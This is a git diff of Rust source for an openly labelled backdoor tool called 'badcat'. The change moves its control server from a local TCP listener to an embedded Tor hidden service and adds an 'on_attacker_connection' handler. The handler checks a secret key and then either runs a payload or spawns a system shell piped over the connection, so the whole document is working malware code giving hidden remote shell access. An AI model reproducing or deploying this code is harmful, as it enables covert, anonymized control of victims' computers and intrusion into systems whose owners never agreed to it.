@@ -5,17 +5,16 @@ mod config;
 mod payload;
 mod setting;
 
-use std::{env, fs, io};
 use std::error::Error;
 use std::io::{Read, Write};
-use std::net::{TcpListener, TcpStream};
 use std::path::PathBuf;
 use std::process::{Command, Stdio};
+use std::{env, fs, io};
 
 use setting::Setting;
 
 use badcat_lib::io as badcat_io;
-use tor::Tor;
+use tor::{stream::Connection, Tor};
 
 fn main() -> Result<(), Box<dyn Error>> {
     let setting = Setting::new()?;
@@ -23,7 +22,7 @@ fn main() -> Result<(), Box<dyn Error>> {
     let argument = env::args().nth(1).unwrap_or("".to_owned());
 
     if argument.eq("--exec-payload") {
-        return payload::execute(&setting)
+        return payload::execute(&setting);
     }
 
     if cfg!(unix) {
@@ -31,10 +30,11 @@ fn main() -> Result<(), Box<dyn Error>> {
         // be private, only readable and writable by the owner.
         //
         // It's a best-effort approach so it can fail and hopefully
-        // all works fine. 
+        // all works fine.
         if let Ok(proc) = Command::new("chmod")
-            .args(["700", setting.tor_dir.to_str().unwrap()])
-            .status() {
+            .args(["700", &setting.tor_dir])
+            .status()
+        {
             if !proc.success() {
                 println!("WARN: problem changing data directory permission");
             }
@@ -43,77 +43,68 @@ fn main() -> Result<(), Box<dyn Error>> {
         }
     }
 
-    start_control_server(&setting)?;
+    start_backdoor(setting)
+}
 
-    Ok(())
+/// Start the server for receiving attacker instructions.
+fn start_backdoor(setting: Setting) -> Result<(), Box<dyn Error>> {
+    let config = setting.tor_dir_path().join("config");
+    unbundle_torrc(&config, &setting)?;
+
+    // start the embeded Tor instance
+    let tor = Tor::new(&config);
+
+    tor::stream::listen_connections(80, on_attacker_connection)?;
+
+    tor.stop()
 }
 
 /// Write a new torrc to `path`. It always reads the template torrc from `setting`.
-fn unbundle_torrc(path: &PathBuf, port: u16, setting: &Setting) -> io::Result<()> {
+fn unbundle_torrc(path: &PathBuf, setting: &Setting) -> io::Result<()> {
     let mut contents = setting.torrc.clone();
 
-    contents = contents.replace("@{DATA_DIR}", setting.tor_dir.to_str().unwrap());
-
-    contents = contents.replace("@{SERVICE_ADDR}", &format!("127.0.0.1:{}", port));
+    contents = contents.replace("@{DATA_DIR}", &setting.tor_dir);
 
     fs::write(&path, &contents)
 }
 
-/// Start the TCP server for receiving attacker instructions.
-fn start_control_server(setting: &Setting) -> Result<(), Box<dyn Error>> {
-    let listener = TcpListener::bind("127.0.0.1:0")?;
+fn on_attacker_connection(conn: &mut Connection) {
+    let setting = Setting::new().unwrap_or_else(|_| {
+        panic!("problem loading settings");
+    });
 
-    let port = listener.local_addr()?.port();
-    println!("INFO: listening at: {:?}", port);
+    println!("INFO: received connection");
 
-    let config = &setting.tor_dir.join("config");
-    unbundle_torrc(&config, port, &setting)?;
-
-    // start the embeded Tor instance
-    let tor = Tor::new(config);
-
-    for stream in listener.incoming() {
-        match stream {
-            Ok(mut stream) => {
-                println!("INFO: received connection");
-                if let Ok(()) = authenticate(&mut stream, &setting) {
-                    println!("INFO: attacker authenticated");
-                    if setting.uses_payload {
-                        // Triggers the payload to execute
-                        if let Err(err) = payload::from_process() {
-                            println!("problem creating payload process: {:?}", err);
-                        }
-                    } else if let Err(error) = connect_shell(stream) {
-                        println!("connection error: {:?}", error);
-                    }
-                } else {
-                    println!("INFO: failed authentication");
-                }
+    if authenticate(conn, &setting) {
+        println!("INFO: attacker authenticated");
+        if setting.uses_payload {
+            // Triggers the payload to execute
+            if let Err(err) = payload::from_process() {
+                println!("problem creating payload process: {:?}", err);
             }
-            Err(error) => return Err(Box::new(error)),
+        } else if let Err(error) = connect_shell(conn) {
+            println!("connection error: {:?}", error);
         }
+    } else {
+        println!("INFO: failed authentication");
     }
-
-    tor.stop()?;
-
-    Ok(())
 }
 
-/// An extremely simple TCP authentication. Receives the password - 88 bytes
+/// An extremely simple authentication. Receives the password - 88 bytes
 /// by default with the 64 byte secret key - and compares against the secret key.
-/// 
+///
 /// Sends a 1 byte one value if authenticated and zero otherwise.
-fn authenticate(stream: &mut TcpStream, setting: &Setting) -> Result<(), Box<dyn Error>> {
+fn authenticate(stream: &mut Connection, setting: &Setting) -> bool {
     let mut buf = Vec::new();
 
-    // allocate a buffer size of key length
     for _ in 0..setting.key.len() {
         buf.push(0);
     }
 
-    if let Err(err) = stream.read_exact(&mut buf) {
-        return Err(err.into());
-    }
+    if let Err(err) = stream.read(&mut buf) {
+        println!("problem on reading auth: {:?}", err);
+        return false;
+    };
 
     let untrusted_key = String::from_utf8_lossy(&buf);
 
@@ -122,23 +113,16 @@ fn authenticate(stream: &mut TcpStream, setting: &Setting) -> Result<(), Box<dyn
     let reply = if equals { &[1] } else { &[0] };
 
     if let Err(err) = stream.write(reply) {
-        return Err(err.into());
+        println!("problem on sending auth reply: {:?}", err);
+        return false;
     }
 
-    if let Err(err) = stream.flush() {
-        return Err(err.into());
-    }
-
-    if equals {
-        Ok(())
-    } else {
-        Err(String::from("not authenticated").into())
-    }
+    equals
 }
 
 /// Start a shell process and redirect STDIN, STDOUT and STDERR to
 /// the TCP stream.
-fn connect_shell(stream: TcpStream) -> Result<(), Box<dyn Error>> {
+fn connect_shell(stream: &mut Connection) -> Result<(), Box<dyn Error>> {
     let mut args: Vec<&str> = Vec::new();
 
     let shell = if cfg!(windows) {
@@ -161,9 +145,9 @@ fn connect_shell(stream: TcpStream) -> Result<(), Box<dyn Error>> {
     let stdout = proc.stdout.unwrap();
     let stderr = proc.stderr.unwrap();
 
-    let stream_in = stream.try_clone()?;
-    let stream_out = stream.try_clone()?;
-    let stream_err = stream.try_clone()?;
+    let stream_in = stream.clone();
+    let stream_out = stream.clone();
+    let stream_err = stream.clone();
 
     let in_thread = badcat_io::pipe_io(stream_in, stdin);
     let out_thread = badcat_io::pipe_io(stdout, stream_out);
